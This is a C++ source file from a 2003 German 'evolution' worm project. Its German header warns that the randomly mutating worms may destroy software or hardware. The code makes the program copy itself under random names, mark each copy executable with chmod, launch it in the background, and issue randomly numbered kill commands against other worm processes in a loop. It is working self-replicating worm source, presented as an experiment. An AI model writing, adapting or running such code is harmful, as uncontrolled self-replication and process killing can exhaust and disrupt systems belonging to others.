/*
                        _________________ ___________
                       /  _____/\_   ___ \\_   _____/
                      /   \  ___/    \  \/ |    __)
                      \    \_\  \     \____|     \
                       \______  /\______  /\___  /
                              \/        \/     \/
                        The German Computer Freaks
                         www.gcf.de    Since 1997                         /\
                                                                         /  \
________________________________________________________________________/ # /
evolution|etwo R001 - eww.cpp (eww)                             Science \  /
� das evolution-Team, 25.05.2003 - www.gcf.de/evolution                  \/

-----------------------------------WARNUNG-----------------------------------
Der Einsatz von evolution|etwo ist mit Gefahren f�r Hard- und Software
verbunden und geschieht auf eigene Gefahr.
Da evolution-W�rmer nur durch Zufall und v�llig unkontrolliert mutieren,
k�nnen auch b�sartige und destruktive W�rmer entstehen, die Ihr System - sei
es die Software oder auch die Hardware - zerst�ren k�nnten. F�hren Sie den
Wurm deshalb nur aus, wenn Sie in Kauf nehmen, dass so etwas passieren kann,
und wenn der Rechner, auf dem Sie es starten m�chten, Ihr pers�nliches
Eigentum ist.
evolution|etwo wird auf vielfachen Wunsch trotz dieser nicht unbeachtlichen
Risiken, �ber die Sie nun aufgekl�rt worden sind, zum Download (auf Request)
angeboten.
Setzen Sie evolution zu destruktiven Zwecken oder zu Sabotagezwecken ein,
drohen Ihnen strafrechtliche Konsequenzen.
F�r s�mtliche Sch�den die durch evolution|etwo - sei es direkt oder indirekt
- entstehen, ist alleine derjenige verantwortlich, der es auf dem
betreffenden PC startete.
-----------------------------------WARNUNG-----------------------------------

� 2003 das evolution-Team. Alle Rechte vorbehalten.
Nicht gestattet sind unerlaubte Vervielf�ltigung, Verleih, Verkauf,
Weitergabe, Ver�ffentlichung oder Nutzung innerhalb anderen Projekten.
Das evolution-Team beh�lt sich vor, bestimmte �bereink�nfte zur Nutzung
dieses Software-Paketes jederzeit zu �ndern oder zu widerrufen.

*/

#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <iostream>
#include <signal.h>

using namespace std;

int aktpid;

char randomname[21];
extern void execute(char *);
extern void getrandomname();

int main(int argc, char *argv[]) {
	signal(SIGHUP, SIG_IGN);
	aktpid = getpid();
	srand((unsigned) time(NULL) * aktpid);
	
	int g = 0;
	int h = 0;
	
	// Agressionstrieb & Vermehrung
	char ckill[17] = "wurmkill       &";
	char ccopy[47] = "wcpy                                          ";
	while (rand() % 5) {
		h++;
		ckill[9] = char (48 + (rand() % 4));
		for (int j = 10; j < 14; j++) {
			ckill[j] = char (48 + (rand() % 10));
		}
		cout << aktpid << "| " << argv[0] << "| Ausgef�hrt: " << ckill << endl;
		system(ckill);
		g++;
		cout << aktpid << "| " << argv[0] << "| Reprod. " << g << " Anfang" << endl;
		getrandomname();
		for (int j = 5; j < 25; j++) {
			ccopy[j] = argv[0][j - 3];
		}
		for (int j = 26; j < 46; j++) {
			ccopy[j] = randomname[j - 26];
		}
		system(ccopy);
		execute(randomname);
		cout << aktpid << "| " << argv[0] << "| Reprod. " << g << " Ende" << endl;
	}
	
	cout << aktpid << "| " << argv[0] << "| Gestorben nach " << g << " Reprod. und " << h << " Kills" << endl;
	
	return 0;
}

void getrandomname() {
	for (int c = 0; c < 20; c++) {
		randomname[c] = char (97 + (rand() % 26));
	}
}

void execute(char *dest) {
	int i;
	
	char command1[33] = "chmod a+x                       ";
	for (i = 0; i < 20; i++) {
		command1[10 + i] = dest[i];
	}
	system(command1);
	
	char command2[25] = "./                     &";
	for (i = 0; i < 20; i++) {
		command2[2 + i] = dest[i];
	}
	system(command2);
}
